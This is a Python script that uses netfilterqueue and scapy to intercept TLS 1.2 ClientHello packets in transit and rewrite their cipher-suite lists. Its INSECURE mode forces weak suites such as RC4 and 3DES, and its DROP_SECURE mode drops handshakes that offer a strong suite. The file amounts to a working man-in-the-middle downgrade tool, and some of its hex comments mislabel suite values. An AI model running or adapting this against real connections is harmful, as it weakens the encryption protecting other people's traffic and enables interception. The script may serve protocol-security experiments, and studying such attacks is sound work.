#!/usr/bin/python3.10
import netfilterqueue
import scapy
import scapy.packet
import scapy.layers.inet
import scapy.layers.tls.record
import scapy.layers.tls.handshake
import scapy.layers.tls.crypto.suites

# Available operating modes
ORIGINAL, DEBUG, INSECURE, SECURE, DROP_SECURE = 0, 1, 2, 3, 4

# Set operating mode
config = DEBUG

# List of secure cipher suites, make sure to add more if handshake fails with server
secureCipherSuites = [
    scapy.layers.tls.crypto.suites.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384.val, # 0x009c
    scapy.layers.tls.crypto.suites.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256.val # 0xc02f
]

# Allow all 'insecure' to have better change at server support
insecureCipherSuites = [
    scapy.layers.tls.crypto.suites.TLS_RSA_WITH_3DES_EDE_CBC_SHA.val, 
    scapy.layers.tls.crypto.suites.TLS_RSA_WITH_RC4_128_SHA.val, 
    #scapy.layers.tls.crypto.suites.TLS_RSA_WITH_AES_128_CBC_SHA.val,
    #scapy.layers.tls.crypto.suites.TLS_RSA_WITH_AES_256_CBC_SHA.val,
    #scapy.layers.tls.crypto.suites.TLS_RSA_WITH_AES_128_CBC_SHA256.val,
    #scapy.layers.tls.crypto.suites.TLS_RSA_WITH_AES_256_CBC_SHA256.val
]

def pktHandler(pkt):
    scapyPkt = scapy.layers.inet.IP(pkt.get_payload()) # Parse to scapy packet

    if (scapyPkt.haslayer("TLS") and                     # Layer => TLS
        scapyPkt['TLS'].type == 22 and                   # Type => Handshake
        hasattr(scapyPkt['TLS'].msg[0], 'version') and   # Has version
        scapyPkt['TLS'].msg[0].version == int(0x303) and # Version => TLS v1.2
        hasattr(scapyPkt['TLS'].msg[0], 'msgtype') and   # Has msgtype
        scapyPkt['TLS'].msg[0].msgtype == 1):            # Handshake message type => Client Hello
     
        print(scapyPkt.summary())
        print("TLS version:", hex(scapyPkt['TLS'].msg[0].version))
        print("Original:", scapyPkt['TLS'].msg[0].ciphers)
        #print(scapyPkt.show())

        ciphers = int(scapyPkt['TLS'].msg[0].cipherslen/2)

        if(config == SECURE):
            for idx in range(0, len(secureCipherSuites)):
                scapyPkt['TLS'].msg[0].ciphers[idx] = int(secureCipherSuites[idx])
            for idx in range(len(secureCipherSuites), ciphers-1):
                scapyPkt['TLS'].msg[0].ciphers[idx] = int(secureCipherSuites[0])
        elif(config == INSECURE):
            for idx in range(0, len(insecureCipherSuites)):
                scapyPkt['TLS'].msg[0].ciphers[idx] = int(insecureCipherSuites[idx])
            for idx in range(len(insecureCipherSuites), ciphers-1):
                scapyPkt['TLS'].msg[0].ciphers[idx] = int(insecureCipherSuites[0])
        elif(config == DEBUG):
            # Swap 2 cipher suites, avoid possiblity of removing a required suite
            #, while stll emulating the same effect as overwritting
            x = scapy.layers.tls.crypto.suites.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256.val # 0xc02b
            y = scapy.layers.tls.crypto.suites.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256.val # 0x009c
            xDetected, yDetected = 0, 0
            xPos, yPos = 0, 0
            idx = 0
            while(idx < ciphers-1):
                if (scapyPkt['TLS'].msg[0].ciphers[idx] == int(x)): 
                    xDetected, xPos = 1, idx
                elif (scapyPkt['TLS'].msg[0].ciphers[idx] == int(y)): 
                    yDetected, yPos = 1, idx
                if (xDetected and yDetected):
                    # Swap cipher suites 
                    scapyPkt['TLS'].msg[0].ciphers[xPos], scapyPkt['TLS'].msg[0].ciphers[yPos] = (
                            scapyPkt['TLS'].msg[0].ciphers[yPos], scapyPkt['TLS'].msg[0].ciphers[xPos])
                    print("Swapping", xPos, "and", yPos)
                    break
                idx += 1
        elif(config == DROP_SECURE):
            idx = 0
            while(idx < ciphers-1):
                if (scapyPkt['TLS'].msg[0].ciphers[idx] == 
                    scapy.layers.tls.crypto.suites.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384.val): # 0x009c
                    pkt.drop()
                    return 
        elif(config == ORIGINAL):
            pass

        # Make scapy re-compute the checksums; Else packets are dropped
        del scapyPkt['IP'].chksum
        del scapyPkt['TCP'].chksum

        # Python3 uses bytes() instead of str()
        pkt.set_payload(bytes(scapyPkt))                   # Set payload
        scapyPkt = scapy.layers.inet.IP(pkt.get_payload()) # Get payload
        print("Modified:", scapyPkt['TLS'].msg[0].ciphers) # Verify 
        #print(scapyPkt.show())

    pkt.accept()

#load_layer("tls")

print("Scapy version", scapy.__version__)
nfqueue = netfilterqueue.NetfilterQueue()
nfqueue.bind(queue_num=2, user_callback=pktHandler) 

try: 
    nfqueue.run()
except KeyboardInterrupt:
    nfqueue.unbind()

